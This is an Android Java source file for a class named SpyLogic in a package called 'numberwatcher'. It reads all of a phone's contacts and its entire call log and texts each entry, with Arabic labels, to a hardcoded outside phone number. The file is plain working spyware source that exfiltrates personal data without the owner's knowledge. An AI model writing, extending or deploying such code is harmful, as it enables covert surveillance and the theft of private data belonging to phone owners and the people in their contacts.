
package com.example.numberwatcher;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;

public class SpyLogic {

    public static void sendContacts(Context context) {
        Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);

        SmsManager smsManager = SmsManager.getDefault();

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                String msg = "== جهة اتصال ==\nالاسم: " + name + "\nالرقم: " + number;
                smsManager.sendTextMessage("+967775993565", null, msg, null, null);
            }
            cursor.close();
        }
    }

    public static void sendCallLogs(Context context) {
        Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");

        SmsManager smsManager = SmsManager.getDefault();

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                String callType = "غير معروف";
                switch (Integer.parseInt(type)) {
                    case CallLog.Calls.OUTGOING_TYPE: callType = "صادرة"; break;
                    case CallLog.Calls.INCOMING_TYPE: callType = "واردة"; break;
                    case CallLog.Calls.MISSED_TYPE: callType = "مفقودة"; break;
                }

                String msg = "== سجل مكالمة ==\nالرقم: " + number + "\nالنوع: " + callType +
                             "\nالمدة: " + duration + " ثانية";

                smsManager.sendTextMessage("+967775993565", null, msg, null, null);
            }
            cursor.close();
        }
    }
}
